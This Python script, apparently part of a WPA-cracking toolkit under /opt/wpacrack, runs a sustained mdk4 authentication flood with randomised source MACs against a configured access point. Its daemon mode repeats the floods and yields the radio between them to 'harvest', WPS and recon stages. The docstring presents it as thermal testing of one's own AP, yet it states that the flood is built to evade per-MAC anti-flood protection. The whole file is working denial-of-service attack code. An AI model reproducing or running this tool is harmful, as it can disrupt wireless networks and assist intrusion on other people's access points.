#!/usr/bin/env python3
"""
apstress.py — scope-locked, opt-in, TIME-BOUNDED AP thermal/power stress load (own-AP hardware
characterization). Drives sustained SoC load on the authorized AP so its heat/power response can be
measured with an external IR thermometer / power meter, for lab evidence.

METHOD — maximum CONTINUAL load that surpasses per-MAC anti-flood:
  mdk4 authentication flood (`mdk4 <iface> a -a <bssid>`) sprays association/auth frames from
  *randomised source MACs*. Per-MAC rate-limiting/blacklisting can't latch onto any one MAC, and
  every fake client forces the AP to allocate association-table state -> the SoC stays pegged =
  continual dynamic power = the largest thermal signal reachable over RF (no LAN).

LOCKOUT SAFETY (the hard rule):
  This tool sends NO WPS frames whatsoever, so it CANNOT trip a WPS lockout (that is a separate
  subsystem driven by failed PIN attempts). The random-MAC flood also *evades* per-MAC anti-flood
  rather than tripping it. Worst realistic case is a transient, self-recovering AP reboot under
  extreme load — not a lockout — which is why the run is HARD-BOUNDED in time and instantly
  stoppable (you watch the IR gun; an IR reading can't auto-abort, so duration + your hand is the cap).

OTHER GUARANTEES: scope-locked to the authorized BSSID only; opt-in gate (ships DISARMED, never
boot-enabled); coexists with the harvest via the shared radio lock; BSSID-anchored channel (follows
a moved AP); logs stage/heartbeat timestamps so IR readings line up into a load->temperature curve.
"""
import os, sys, re, time, signal, shutil, subprocess, fcntl, datetime

CONF_PATHS = ["/opt/wpacrack/wpacrack.conf",
              os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack.conf")]
WORK       = "/opt/wpacrack"
RADIO_LOCK = WORK + "/.radio.lock"
LOG        = WORK + "/apstress.log"
STATUS     = WORK + "/APSTRESS_STATUS.txt"
EVID       = WORK + "/apstress_evidence.csv"      # timestamped load log to align with IR readings

IFACE      = "wlan1"
ESSID      = ""
TARGETS    = []

ENABLED    = False       # HARD opt-in gate: no flooding until stress_enabled = true
MAX_SECONDS = 1200       # flood duration per cycle (also the one-shot hard cap)
COOLDOWN   = 180         # daemon: seconds to YIELD the radio between flood cycles (so the harvest/
                         # WPS/aprecon still get turns — "continual" but coexisting). Short = hot.
GATE_POLL  = 120         # daemon: how often to re-check the arm gate while disarmed
HEARTBEAT  = 30          # seconds between elapsed/status log lines (for IR-reading alignment)
RADIO_WAIT = 600         # seconds to wait for the shared radio
REQUIRED_TOOLS = ("mdk4", "iw", "ip")

_radio_fd = None
_children = []
_stop = False            # ends the current flood cycle
_terminate = False       # exits the daemon loop entirely (on SIGTERM/SIGINT)


def now(): return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log(msg):
    line = f"[{now()}] {msg}\n"
    try:
        with open(LOG, "a") as f: f.write(line)
    except Exception: pass
    sys.stderr.write(line)

def set_status(phase, detail=""):
    try:
        with open(STATUS, "w") as f:
            f.write(f"apstress STATUS @ {now()}\n  phase : {phase}\n  detail: {detail}\n"
                    f"  bssid : {TARGETS[0][0] if TARGETS else '?'}  iface: {IFACE}\n")
    except Exception: pass
    log(f"{phase}: {detail}")

def _val(v): return str(v).split("#")[0].strip()

def run(cmd, timeout=30):
    try: return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception as e: log(f"run error {cmd}: {e}"); return None


def load_conf():
    global IFACE, ESSID, TARGETS, ENABLED, MAX_SECONDS, COOLDOWN
    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
    if not path:
        log("FATAL: no wpacrack.conf"); sys.exit(2)
    cfg = {}
    for line in open(path):
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1); cfg[k.strip().lower()] = v.strip()
    IFACE = _val(cfg.get("stress_iface", cfg.get("iface", IFACE))) or IFACE
    ESSID = _val(cfg.get("essid", ""))
    ENABLED = _val(cfg.get("stress_enabled", "false")).lower() in ("1", "true", "yes", "on")
    try: MAX_SECONDS = int(_val(cfg.get("stress_max_seconds", str(MAX_SECONDS))))
    except Exception: pass
    try: COOLDOWN = int(_val(cfg.get("stress_cooldown", str(COOLDOWN))))
    except Exception: pass
    TARGETS = []
    for tok in cfg.get("targets", "").split(","):
        tok = tok.strip()
        if ":" in tok:
            bssid, _, ch = tok.rpartition(":")
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid.strip()) and ch.strip().isdigit():
                TARGETS.append((bssid.strip().upper(), int(ch.strip())))
    if not TARGETS:
        log("FATAL: no authorized target in wpacrack.conf — refusing to run"); sys.exit(2)


def preflight():
    missing = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
    if missing:
        log(f"FATAL: missing tools: {', '.join(missing)}"); sys.exit(3)


def published_channel(bssid, hint, ttl=21600):
    """BSSID-anchored current channel from the harvest, so we stress the AP on its real channel."""
    try:
        ch, ts = open(os.path.join(WORK, "channels", bssid.replace(":", ""))).read().split()
        if time.time() - float(ts) < ttl:
            return int(ch)
    except Exception:
        pass
    return hint


# ---------------- radio coexistence ----------------
def acquire_radio():
    global _radio_fd
    try: _radio_fd = open(RADIO_LOCK, "w")
    except Exception: return True
    t0 = time.time()
    while time.time() - t0 < RADIO_WAIT:
        try:
            fcntl.flock(_radio_fd, fcntl.LOCK_EX | fcntl.LOCK_NB); return True
        except OSError:
            set_status("wait-radio", f"harvest holds the radio; waiting {int(time.time()-t0)}s")
            time.sleep(15)
    return False

def release_radio():
    global _radio_fd
    if _radio_fd:
        try: fcntl.flock(_radio_fd, fcntl.LOCK_UN); _radio_fd.close()
        except Exception: pass
        _radio_fd = None

def is_monitor():
    info = run(["iw", "dev", IFACE, "info"])
    return "type monitor" in (getattr(info, "stdout", "") or "")

def ensure_monitor(ch, force=False):
    if force or not is_monitor():
        run(["ip", "link", "set", IFACE, "down"])
        run(["iw", "dev", IFACE, "set", "type", "monitor"])
        run(["ip", "link", "set", IFACE, "up"])
    run(["iw", "dev", IFACE, "set", "channel", str(ch)])


def evidence(stage, elapsed, note=""):
    """Append a timestamped row so external IR-thermometer / power readings can be aligned to load."""
    try:
        new = not os.path.exists(EVID)
        with open(EVID, "a") as f:
            if new:
                f.write("timestamp,elapsed_s,stage,note,ir_temp_C_fill_in,power_W_fill_in\n")
            f.write(f"{now()},{elapsed},{stage},{note},,\n")
    except Exception:
        pass


def stress_run():
    bssid, hint = TARGETS[0]
    ch = published_channel(bssid, hint)
    ensure_monitor(ch, force=True)   # mdk4 injects only in monitor mode — force it, don't trust a stale report
    set_status("baseline", f"{bssid} ch{ch} — record IDLE IR temp now; flood starts in 10s")
    evidence("baseline", 0, "idle before flood — take IR baseline reading")
    time.sleep(10)   # gives you a moment to take the cold-baseline IR reading

    # max continual load: mdk4 auth flood with randomised source MACs (surpasses per-MAC anti-flood)
    cmd = ["mdk4", IFACE, "a", "-a", bssid]
    log("exec: " + " ".join(cmd))
    try:
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        set_status("error", f"mdk4 spawn failed: {e}"); return
    _children.append(p)
    t0 = time.time()
    set_status("flooding", f"{bssid} ch{ch} — mdk4 auth flood (random MACs); max {MAX_SECONDS}s; watch the IR gun")
    evidence("flood-start", 0, "sustained auth flood begins")
    try:
        while not _stop and (time.time() - t0) < MAX_SECONDS:
            # mdk4 only injects in monitor mode. If wlan1 drifted to managed (NM/driver/harvest churn)
            # the flood is silently doing NOTHING — detect it, re-assert monitor, and respawn mdk4.
            drifted = not is_monitor()
            if drifted:
                log("wlan1 not in monitor mid-flood — re-asserting monitor + restarting mdk4 (flood was NOT injecting)")
                ensure_monitor(ch, force=True)
            if drifted or p.poll() is not None:
                try: p.terminate(); p.wait(timeout=3)
                except Exception:
                    try: p.kill()
                    except Exception: pass
                p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); _children.append(p)
            el = int(time.time() - t0)
            mon = "monitor-OK" if is_monitor() else "NOT-monitor"
            set_status("flooding", f"{bssid} ch{ch} — flooding {el}s/{MAX_SECONDS}s [{mon}] (log an IR reading each heartbeat)")
            evidence("flood", el, "take an IR reading now")
            slept = 0
            while slept < HEARTBEAT and not _stop:
                time.sleep(1); slept += 1
    finally:
        el = int(time.time() - t0)
        for c in _children[:]:
            try: c.terminate()
            except Exception: pass
        time.sleep(1)
        for c in _children[:]:
            try: c.kill()
            except Exception: pass
        evidence("flood-stop", el, "flood stopped — record peak IR temp, then watch cool-down")
        set_status("cooldown", f"flood stopped after {el}s — record peak IR temp; log cool-down readings")


def _one_cycle():
    """Borrow the radio, run one bounded flood session, then hand the radio back so the rest of the
    pipeline gets a turn. Returns after the flood cycle (or immediately if the radio stays busy)."""
    if not acquire_radio():
        set_status("no-radio", "could not borrow the radio (harvest busy) — will retry"); return
    try:
        stress_run()
    finally:
        run(["iw", "dev", IFACE, "set", "channel", str(TARGETS[0][1])])
        release_radio()
        set_status("cooldown", f"radio yielded to the pipeline for {COOLDOWN}s (harvest/WPS/aprecon get a turn)")


def _install_signals():
    def on_sig(s, f):
        global _stop, _terminate
        _stop = True; _terminate = True; log(f"signal {s} — stopping flood + exiting")
    signal.signal(signal.SIGTERM, on_sig); signal.signal(signal.SIGINT, on_sig)


def run_once():
    """Single bounded flood (manual `apstress-run` without --daemon)."""
    load_conf()
    if not ENABLED:
        set_status("disabled", "stress_enabled is not true — dormant. Arm with `sudo apstress-arm`."); return
    preflight(); _install_signals(); _one_cycle()
    set_status("done", "single stress run complete; evidence -> apstress_evidence.csv")


def daemon_loop():
    """Continual, AUTO stress as part of the pipeline: loop flood -> yield -> flood, re-reading the
    arm gate each cycle (so `apstress-disarm` stops it without a restart) and yielding the radio
    between floods so the harvest/WPS/aprecon still run. Duty cycle = MAX_SECONDS flood : COOLDOWN
    yield (short yield = the AP stays hot). NO WPS frames -> still cannot cause a WPS lockout."""
    _install_signals()
    preflighted = False
    log("apstress daemon starting (continual, duty-cycled, lockout-safe, pipeline-coexisting)")
    while not _terminate:
        try:
            load_conf()
            if not ENABLED:
                set_status("dormant", "stress_enabled=false — service up but idle. Arm with `sudo apstress-arm`.")
                _sleep_interruptible(GATE_POLL); continue
            if not preflighted:
                preflight(); preflighted = True
            _one_cycle()
        except SystemExit:
            raise
        except Exception:
            import traceback; log("daemon cycle error:\n" + traceback.format_exc())
        _sleep_interruptible(COOLDOWN)


def _sleep_interruptible(secs):
    slept = 0
    while slept < secs and not _terminate:
        time.sleep(1); slept += 1


if __name__ == "__main__":
    if "--daemon" in sys.argv:
        daemon_loop()
    else:
        run_once()
